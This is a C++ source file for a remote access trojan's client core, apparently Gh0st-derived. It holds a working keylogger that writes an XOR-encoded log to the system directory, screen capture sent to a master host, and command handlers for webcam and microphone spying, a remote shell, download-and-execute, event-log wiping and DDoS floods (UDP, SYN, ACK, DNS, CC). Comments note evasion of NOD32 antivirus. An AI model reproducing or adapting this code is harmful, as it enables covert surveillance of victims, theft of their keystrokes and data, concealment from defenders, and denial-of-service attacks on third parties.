// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KernelManager.h"
#include "SystemManager.h"
#include "loop.h"
#include "until.h"
#include "install.h"
#include <Tlhelp32.h>
#include "ddos.h"
#include "TCHAR.h"


#include <Windows.h>
#include <stdio.h>
#include <tchar.h>

#pragma warning(disable:4996)

#define TAG_DEV_PLAS  1
#define BITS_PER_PIX  32
#define NO_COLOR_TAB  0
#define UNCMP_RGB     0
#define H_RESOL_0     0
#define V_RESOL_0     0
#define ALL_COLOR     0

#define MUST_ZERO     0
#define TYPE_BMP      0x4D42

#define FILE_HEAD     sizeof(BITMAPFILEHEADER)
#define INFO_HEAD     sizeof(BITMAPINFOHEADER)
#define HEAD_SIZE     sizeof(BITMAPINFOHEADER) + sizeof(BITMAPFILEHEADER)
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = {0};
UINT	CKernelManager::m_nMasterPort = 80;

HINSTANCE	CKernelManager::g_hInstance = NULL;
DWORD		CKernelManager::m_dwLastMsgTime = GetTickCount();

///////////////////////////////////////////////////////////////////// key log
TCHAR KeyBuffer[2048]; 
void SaveToFile(TCHAR *lpBuffer)
{
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\MODIf.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_WRITE, FILE_SHARE_WRITE,
	NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD dwBytesWrite = 0;
	DWORD dwSize = GetFileSize(hFile, NULL);
	if (dwSize < 1024 * 1024 * 50)
		SetFilePointer(hFile, 0, 0, FILE_END);
	// 加密
	int	nLength = lstrlen(lpBuffer);
	TCHAR*	lpEncodeBuffer = new TCHAR[nLength];
	for (int i = 0; i < nLength; i++)
	lpEncodeBuffer[i] = lpBuffer[i] ^ _T('`');
	WriteFile(hFile, lpEncodeBuffer, lstrlen(lpBuffer)*sizeof(TCHAR), &dwBytesWrite, NULL);
	CloseHandle(hFile);	
	return ;
}
char* LowerCase[] = {
	//   	"b",
   //	    "e",
		   "[Enter]",
		   "[ESC]",
		   "[F1]",
		   "[F2]",
		   "[F3]",
		   "[F4]",
		   "[F5]",
		   "[F6]",
		   "[F7]",   //10
		   "[F8]",
		   "[F9]",
		   "[F10]",
		   "[F11]",
		   "[F12]",
		   "`",
		   "1",
		   "2",
		   "3",
		   "4",      //20
		   "5",
		   "6",
		   "7",
		   "8",
		   "9",
		   "0",
		   "-",
		   "=",
		   "[TAB]",
		   "q",        //30
		   "w",
		   "e",
		   "r",
		   "t",
		   "y",
		   "u",
		   "i",
		   "o",
		   "p",
		   "[",   //40
		   "]",
		   "a",
		   "s",
		   "d",
		   "f",
		   "g",
		   "h",
		   "j",
		   "k",
		   "l",    //50
		   ";",
		   "'",
		   "z",
		   "x",
		   "c",
		   "v",
		   "b",
		   "n",
		   "m",
		   ",",   //60
		   ".",
		   "/",
		   "\\",
		   "[CTRL]",
		   "[WIN]",
		   "[空格]",
		   "[WIN]",
		   "[Print Screen]",
		   "[Scroll Lock]",
		   "[Insert]",    //70
		   "[Home]",
		   "[PageUp]",//
   //		"[Del]",
		   "[Delete]",
		   "[End]",
		   "[PageDown]",//
		   "[Left]",
		   "[UP]",
		   "[Right]",
		   "[Down]",
		   "[Num Lock]",   //80
		   "/",
		   "*",
		   "-",
		   "+",
		   "0",
		   "1",
		   "2",
		   "3",
		   "4",
		   "5",        //90
		   "6",
		   "7",
		   "8",
		   "9",
		   ".",
		   "[INSERT]",
		   "[DELETE]",
		   "[BACKSPACE]",
		   "[CLEAR]",     //99
		   "[Alt]",     //100
		   "[Shift]",     //101
		   "[Pause Break]",     //102
};

char* UpperCase[] = {
	//	    "b",
	//		"e",
			"[Enter]",
			"[ESC]",
			"[F1]",
			"[F2]",
			"[F3]",
			"[F4]",
			"[F5]",
			"[F6]",
			"[F7]",  //10
			"[F8]",
			"[F9]",
			"[F10]",
			"[F11]",
			"[F12]",
			"~",
			"!",
			"@",
			"#",
			"$",   //20
			"%",
			"^",
			"&",
			"*",
			"(",
			")",
			"_",
			"+",
			"[TAB]",
			"Q",         //30
			"W",
			"E",
			"R",
			"T",
			"Y",
			"U",
			"I",
			"O",
			"P",
			"{",      //40
			"}",
			"A",
			"S",
			"D",
			"F",
			"G",
			"H",
			"J",
			"K",
			"L",      //50
			":",
			"\"",
			"Z",
			"X",
			"C",
			"V",
			"B",
			"N",
			"M",
			"<",   //60
			">",
			"?",
			"│",
			"[CTRL]",
			"[WIN]",
			"[空格]",
			"[WIN]",
			"[Print Screen]",
			"[Scroll Lock]",
			"[Insert]",     //70
			"[Home]",
			"[PageUp]",//
		//	"[Del]",
			"[Delete]",
			"[End]",
			"[PageDown]",//
			"[Left]",
			"[Up]",
			"[Right]",
			"[Down]",
			"[Num Lock]",  //80
			"/",
			"*",
			"-",
			"+",
			"0",
			"1",
			"2",
			"3",
			"4",
			"5",     //90
			"6",
			"7",
			"8",
			"9",
			".",
			"[INSERT]",
			"[DELETE]",
			"[BACKSPACE]",
			"[CLEAR]",     //99
			"[Alt]",     //100
			"[Shift]",     //101
			"[Pause Break]",     //102
};
int SpecialKeys[] = {
	//	    8,
			13,
			27,
			112,
			113,
			114,
			115,
			116,
			117,
			118,  //10
			119,
			120,
			121,
			122,
			123,
			192,
			49,
			50,
			51,
			52,   //20
			53,
			54,
			55,
			56,
			57,
			48,
			189,
			187,
			9,
			81,   //30
			87,
			69,
			82,
			84,
			89,
			85,
			73,
			79,
			80,
			219,  //40
			221,
			65,
			83,
			68,
			70,
			71,
			72,
			74,
			75,
			76,   //50
			186,
			222,
			90,
			88,
			67,
			86,
			66,
			78,
			77,
			188,   //60
			190,
			191,
			220,
			17,
			91,
			32,
			92,
			44,
			145,
			45,    //70
			36,
			33,//
			46,
			35,
			34,//
			37,
			38,
			39,
			40,
			144,   //80
			111,
			106,
			109,
			107,
			96,
			97,
			98,
			99,
			100,
			101,   //90
			102,
			103,
			104,
			105,
			110,
			46,
			45,
			8,
			12,   //99
			18,   //100 
			16,   //101
			19,   //102  //因为少了最前面的一个 所以是101
};

HWND PreviousFocus = NULL;
CHAR WindowCaption[1024] = { 0 };
HWND hFocus = NULL;
BOOL IsWindowsFocusChange()
{

	memset(WindowCaption, 0, sizeof(WindowCaption));
	hFocus = GetForegroundWindow();
	GetWindowText(hFocus, WindowCaption, sizeof(WindowCaption));


	BOOL ReturnFlag = FALSE;
	CHAR temp[1024] = { 0 };
	if (hFocus == PreviousFocus)
	{

	}
	else
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;
			GetLocalTime(&s);
			wsprintf(temp, "\r\n[标题:]%s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n", WindowCaption, s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
			SaveToFile(temp);
			memset(temp, 0, sizeof(temp));
			memset(WindowCaption, 0, sizeof(WindowCaption));
			ReturnFlag = TRUE;
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag;
}
BOOL KeyStary = TRUE;
DWORD WINAPI KeyLogger(LPVOID lparam)
{
	if (KeyStary == FALSE)
	{
		//	MessageBox(NULL,NULL,NULL,NULL);
		return 0;
	}

	KeyStary = FALSE;

	int bKstate[256] = { 0 };
	int i, x;
	CHAR KeyBuffer[600] = { 0 };
	int state;
	int shift;
	memset(KeyBuffer, 0, sizeof(KeyBuffer));

	while (TRUE)
	{
		Sleep(10);
		if (lstrlen(KeyBuffer) != 0)
		{
			if (IsWindowsFocusChange())
			{
				//	lstrcat(KeyBuffer,"\r\n");
				//	lstrcat(KeyBuffer,"\n"); //注释掉解决复制粘贴乱码
				SaveToFile("[内容:]");
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));
			}
			else
			{
				//	lstrcat(KeyBuffer,"\n");//注释掉解决复制粘贴乱码
				SaveToFile(KeyBuffer);
				memset(KeyBuffer, 0, sizeof(KeyBuffer));

			}
		}

		//94
		for (i = 0; i < 101; i++)
		{
			shift = GetKeyState(VK_SHIFT);
			x = SpecialKeys[i];
			if (GetAsyncKeyState(x) & 0x8000)
			{
				//93
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1;
				}
				else                                                                     //93
					if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 93))) //Caps Lock And Shift Is Pressed
					{
						bKstate[x] = 2;
					}
					else
						if (shift < 0)
						{
							bKstate[x] = 3;
						}
						else
							bKstate[x] = 4;
			}
			else
			{
				if (bKstate[x] != 0)
				{
					state = bKstate[x];
					bKstate[x] = 0;
					if (x == 8) //退键
					{
						// 						KeyBuffer[lstrlen(KeyBuffer) - 1] = 0;
						// 						continue;
						lstrcat(KeyBuffer, "<BackSpace>");
						SaveToFile(KeyBuffer);
						memset(KeyBuffer, 0, sizeof(KeyBuffer));
						continue;

					}
					else
						if (lstrlen(KeyBuffer) > 550)
						{
							SaveToFile(KeyBuffer);
							memset(KeyBuffer, 0, sizeof(KeyBuffer));
							continue;
						}
						else
							if (x == 13) //回车
							{
								/*if (lstrlen(KeyBuffer) == 0)
								{
									continue;
								}*///不去掉的话 Enter无法记录
								lstrcat(KeyBuffer, "<Enter>\r\n");//自动换行
								SaveToFile(KeyBuffer);
								memset(KeyBuffer, 0, sizeof(KeyBuffer));
								continue;
							}
							else
							{
								if ((state % 2) == 1)
								{
									lstrcat(KeyBuffer, (CHAR*)UpperCase[i]);

								}
								else
									if ((state % 2) == 0)
									{
										lstrcat(KeyBuffer, (CHAR*)LowerCase[i]);


									}
							}
				}
			}
		}
	}
	return 0;
}

CKernelManager::CKernelManager(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
}

CKernelManager::CKernelManager(CClientSocket *pClient):CManager(pClient)
{
	m_nThreadCount = 0;
}

void CKernelManager::StartUnLineHook()
{	
	m_hThread[m_nThreadCount++] = 
		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0,	NULL, true);
}

void CKernelManager::init(CClientSocket *pClient,LPCTSTR lpszKillEvent, LPCTSTR lpszMasterHost, UINT nMasterPort)
{
	if (lpszKillEvent != NULL)
		lstrcpy(m_strKillEvent, lpszKillEvent);
	if (lpszMasterHost != NULL)
		lstrcpy(m_strMasterHost, lpszMasterHost);

	m_nMasterPort = nMasterPort;
	m_nThreadCount = 0;
	// 初次连接，控制端发送命令表示激活
	m_bIsActived = false;
}

CKernelManager::~CKernelManager()
{
	for(int i = 0; i < m_nThreadCount; i++)
	{
		TerminateThread(m_hThread[i], -1);
		CloseHandle(m_hThread[i]);
	}
}

BOOL SendMSG(SOCKET ss)
{
	if (send(ss,"OK",2,0) == SOCKET_ERROR)
		if(WSAGetLastError()!=WSAEWOULDBLOCK)
		{
			closesocket(ss);
			return 0;
		}
	return 1;
}

BOOL proc_tag = false;
TCHAR temp_proc[1024]={0};

BOOL isProcesin(LPTSTR lpProcess)
{
	HANDLE handle=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
	PROCESSENTRY32* info=new PROCESSENTRY32;
    info->dwSize=sizeof(PROCESSENTRY32);
	if(Process32First(handle,info))
	{
		if(GetLastError()==ERROR_NO_MORE_FILES )
		{
			return false;
		}
		else{		
			if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //过NOD32而注释 杀strupr
			{
				return true;
			}
			while(Process32Next(handle,info)!=FALSE)
			{
				if (strstr(strupr(info->szExeFile),strupr(lpProcess)) > 0) //过NOD32而注释 杀strupr
				{
					return true;
				}
			}
		}
	}
	return false;
	CloseHandle(handle);
}

BOOL CALLBACK EnumWindowsList(HWND hwnd, LPARAM lParam)
{
	TCHAR szClassName[254]={0};
	GetWindowText(hwnd,szClassName,254);
	if (strstr(szClassName,temp_proc) != NULL)
	{
		proc_tag = true;
	}
	return true;
}

// 加上激活
void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_ACTIVED:
		InterlockedExchange((LONG *)&m_bIsActived, true);
		break;
	case COMMAND_DLLMAIN:
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DLL,
			(lpBuffer + 1), 0, NULL);
		break;
	case COMMAND_GN: // 小功能
	{
		switch (lpBuffer[1])
		{
		case DESK_TOP:
		{
				//显示器屏幕
				HDC hCurrScreen = GetDC(NULL);

				//创建一个兼容的DC,在内存中表示当前位图的上下文
				HDC hCmpDC = CreateCompatibleDC(hCurrScreen);

				//宽高
				int iScreenWidth = GetDeviceCaps(hCurrScreen, HORZRES);
				int iScreenHeight = GetDeviceCaps(hCurrScreen, VERTRES);

				//当前屏幕位图
				HBITMAP hBmp = CreateCompatibleBitmap(hCurrScreen, iScreenWidth, iScreenHeight);

				//用当前位图句柄表示内存中屏幕位图上下文
				SelectObject(hCmpDC, hBmp);

				//将当前屏幕图像复制到内存中
				BOOL ret = BitBlt(hCmpDC, 0, 0, iScreenWidth, iScreenHeight, hCurrScreen, 0, 0, SRCCOPY);

				//BMP图像信息头
				BITMAPINFOHEADER hBmpInfo;
				hBmpInfo.biSize = INFO_HEAD;
				hBmpInfo.biWidth = iScreenWidth;
				hBmpInfo.biHeight = iScreenHeight;
				hBmpInfo.biPlanes = TAG_DEV_PLAS;
				hBmpInfo.biClrUsed = NO_COLOR_TAB;
				hBmpInfo.biBitCount = BITS_PER_PIX;
				hBmpInfo.biSizeImage = UNCMP_RGB;
				hBmpInfo.biCompression = BI_RGB;
				hBmpInfo.biClrImportant = ALL_COLOR;
				hBmpInfo.biXPelsPerMeter = H_RESOL_0;
				hBmpInfo.biYPelsPerMeter = V_RESOL_0;

				/* * * * * * * * * * * * * * * * * * * *
				 * Windows按4字节分配内存
				 * 首先计算每行所需要的bit数,并按4字节对齐
				 * 对齐后的数据乘4,从DWORD转为BYTE
				 * 每行实际所占BYTE乘图像列数得到数据源大小
				 * * * * * * * * * * * * * * * * * * * */
				DWORD dwSrcSize = ((iScreenWidth * hBmpInfo.biBitCount + 31) / 32) * 4 * iScreenHeight;

				//截图总大小
				DWORD dwPicSize = HEAD_SIZE + dwSrcSize;

				//BMP图像文件头
				BITMAPFILEHEADER hBmpFile;
				hBmpFile.bfSize = dwPicSize;
				hBmpFile.bfType = TYPE_BMP;
				hBmpFile.bfOffBits = HEAD_SIZE;
				hBmpFile.bfReserved1 = MUST_ZERO;
				hBmpFile.bfReserved2 = MUST_ZERO;

				//BMP图像数据源
				char* bmpSrc = new char[dwSrcSize];
				ZeroMemory(bmpSrc, dwSrcSize);

				//检索指定的兼容位图中的所有位元数据
				//并复制到指定格式的设备无关位图的缓存中
				GetDIBits(hCmpDC, hBmp, 0, (UINT)iScreenHeight, bmpSrc, (BITMAPINFO*)&hBmpInfo, DIB_RGB_COLORS);

				//汇总所有数据信息
				char* szBmp = new char[dwPicSize];
				ZeroMemory(szBmp, dwPicSize);
				memcpy(szBmp, (void*)&hBmpFile, FILE_HEAD);
				memcpy(szBmp + FILE_HEAD, (void*)&hBmpInfo, INFO_HEAD);
				memcpy(szBmp + HEAD_SIZE, bmpSrc, dwSrcSize);
				LPBYTE	lpPacket = new BYTE[dwPicSize+2];
				lpPacket[0] = COMMAND_GN;
				lpPacket[1] = DESK_TOP;
				memcpy(lpPacket + 2, szBmp, dwPicSize  );
				m_pClient->Send(lpPacket, dwPicSize+2);
				//释放资源
				DeleteObject(hBmp);
				DeleteObject(hCmpDC);
				ReleaseDC(NULL, hCurrScreen);
				delete[] szBmp;
				delete[] bmpSrc;
				delete[] lpPacket;
				szBmp = nullptr;
				bmpSrc = nullptr;
				
			
	/*		LPBYTE	lpPacket = new BYTE[nPacketLength];
			lpPacket[0] = COMMAND_OPEN_URL_HIDE;
			memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

			SendSelectCommand(lpPacket, nPacketLength);

			delete[] lpPacket;*/
				break;
		}

		default:
			break;
		}





	}

		break;
	case COMMAND_LIST_DRIVE: // 文件管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
		break;
	case COMMAND_SCREEN_SPY: // 屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_newSCREEN_SPY: // 新屏幕查看
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_newScreenManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_WEBCAM: // 摄像头
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_AUDIO: // 麦克风
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SPEAKER: // 扬声器
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SpeakerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_SYSTEM: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_REGEDIT://注册表管理   
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SERMANAGER:       // 服务管理
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SerManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_PROXY: //
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ProxyManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SHOW_MSG:         // 发送信息
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_MessageBox,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		break;
	case COMMAND_CHAT:             // 远程交谈
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ChatManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SORT_PROCESS: // 进程筛选
		try
		{
			if (isProcesin((LPTSTR)(lpBuffer + 1)))
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_SORT_WINDOW: // 窗体筛选
		try
		{
			strcpy(temp_proc,(LPTSTR)(lpBuffer + 1));
			EnumWindows(EnumWindowsList,0);
			if (proc_tag)
			{
				BYTE bToken = TOKEN_INFO_YES;
				m_pClient->Send(&bToken, 1);
				proc_tag = false;
			}
			else
			{
				BYTE bToken = TOKEN_INFO_NO;
				m_pClient->Send(&bToken, 1);
			}
		}catch(...){}
		break;
	case COMMAND_DDOS_ATTACK:
		{
			DATTACK m_Attack;
			memset(&m_Attack,0,sizeof(DATTACK));
			memcpy(&m_Attack,lpBuffer+1,sizeof(DATTACK));
			
//  			OutputDebugString("开始攻击");
//  			puts("开始攻击");
// 			OutputDebugString(m_Attack.Target);
// 			puts(m_Attack.Target);
// 			char	strTMP[MAX_PATH];
// 			wsprintf(strTMP, "Type: %d",m_Attack.AttackType);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Port:%d",m_Attack.AttackPort);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Time:%d",m_Attack.AttackTime);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
// 			wsprintf(strTMP, "Thread:%d",m_Attack.AttackThread);
// 			OutputDebugString(strTMP);
// 			puts(strTMP);
			
			if(m_Attack.AttackType==1)		//UDP Flood		1	Gh0st版DK
			{
				UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==2)		//SYN Flood		2	暴风7.0
			{
				SYN_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==3)		//ICMP洪水		3	NB5.4代码
			{
				ICMP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==4)		//TCP Connect	4	NB5.4代码
			{
				TCP_CONNECT(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==5)		//传奇私服攻击	5	NB5.4代码
			{
				SF_SF(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==6)		//ACK流量		6	暴风7.0
			{
				ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==7)		//伪造源UDP(流量)	UDP		7	暴风7.0
			{
				WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==8)		//智能攻击		SYN		8	暴风7.0
			{
				OSVERSIONINFOEX	OsVerInfoEx;	// 版本信息  //操作系统信息
				OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
				GetVersionEx((OSVERSIONINFO *)&OsVerInfoEx); // 注意转换类型

				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 0 )
				{
//					pszOS = _T("2000");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 1 )
				{
//					pszOS = _T("XP");
					WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 5 && OsVerInfoEx.dwMinorVersion == 2 )
				{
// 					pszOS = _T("2003");
					ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 0 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("Vista"); 
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 1 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("7");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2008R2");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				if ( OsVerInfoEx.dwMajorVersion == 6 && OsVerInfoEx.dwMinorVersion == 2 )
				{
					if( OsVerInfoEx.wProductType == VER_NT_WORKSTATION)
					{
//						pszOS = _T("8");
						WZUDPS(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
					else
					{
//						pszOS = _T("2012");
						ACK_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
					}
				}else
				{
					UDP_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
				}
			}
			if(m_Attack.AttackType==9)		//无限CC测试	9	DK代码
			{
				CC_SINCON(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==10)		//HTTP Get协议	10	DK代码
			{
				RST_FLOOD(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==11)		//分布式循环CC	11	DK代码
			{
				LX_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread,m_Attack.ExtendData1,m_Attack.ExtendData2);
			}
			if(m_Attack.AttackType==12)		//破防CC	12	暴风7.0
			{
				Break_CC(m_Attack.Target,m_Attack.AttackPort,m_Attack.AttackTime,m_Attack.AttackThread);
			}
			if(m_Attack.AttackType==13)		//DNS攻击
			{
				DNS_ATT(m_Attack.Target,m_Attack.DNSTarget,m_Attack.AttackTime);
			}
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_DDOS_STOP:
		{
//  			OutputDebugString("停止攻击");
// 			puts("停止攻击");
			StopDDOS();
			if(SendMSG(m_pClient->m_Socket)==0)
				return;
		}
		break;
	case COMMAND_SHELL: // 远程终端
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
		break;
	case COMMAND_KEYBOARD: // 键盘记录 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_SYSINFO: 
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SysInfoManager,
			(LPVOID)m_pClient->m_Socket, 0, NULL);
		break;
	case COMMAND_DOWN_EXEC: // 下载者
		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
			(LPVOID)(lpBuffer + 1), 0, NULL, true);
		Sleep(100); // 传递参数用
		break;
	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
		break;
	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
		break;
	case COMMAND_REMOVE: // 卸载,
		UnInstallService();
		break;
	case COMMAND_CLEAN_EVENT: // 清除日志
		CleanEvent();
		break;
	case COMMAND_CLEAN_System: // 清除系统日志
		CleanSystem();
		break;
	case COMMAND_CLEAN_Security: // 清除安全日志
		CleanSecurity();
		break;
	case COMMAND_CLEAN_Application: // 清除程序日志
		CleanApplication();
		break;
	case COMMAND_SESSION:
		ShutdownWindows(lpBuffer[1]);
		break;
	case COMMAND_UPDATE_SERVER: // 更新服务端
		if (UpdateServer((char *)lpBuffer + 1))
			UnInstallService();
		break;
	case COMMAND_RENAME_REMARK: // 改备注
		SetHostID((LPCTSTR)(lpBuffer + 1));
		break;
	case COMMAND_CHANGE_GROUP: // 改分组
		{
			char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
			if (szGetGroup == NULL)
			{
				return;
			}
			SetInfo(szGetGroup, (LPCTSTR)(lpBuffer + 1), "BITS");
		}
		break;
	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
		break;
	}	
}

extern char* MyDecode(char *str);
void CKernelManager::UnInstallService()
{
	//char	*szGetGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "KLMN");
	//if (szGetGroup == NULL)
	//{
	//	return;
	//}

	//char	*szGroup = (char *)FindConfigString(CKernelManager::g_hInstance, "CDEF");
	//if (szGroup == NULL)
	//{
	//	return;
	//}
	//szGroup = (char *)(MyDecode(szGroup + 4));  //解密被加密的字符串
	//
	//char	strAudioListen[MAX_PATH];
	//char	strWebCam[MAX_PATH];
	//
	//GetWindowsDirectory( strAudioListen, sizeof(strAudioListen) );
	//lstrcat( strAudioListen, "\\BAudioListen.dll" );
	//DeleteFile(strAudioListen);
	//
	//GetWindowsDirectory( strWebCam, sizeof(strWebCam) );
	//lstrcat( strWebCam, "\\BWebCam.dll" );
	//DeleteFile(strWebCam);
	//	
	////删除离线记录文件
	//TCHAR	strRecordFile[MAX_PATH];
	//GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	//lstrcat(strRecordFile, _T("\\MODIf.html"));
	//DeleteFile(strRecordFile);
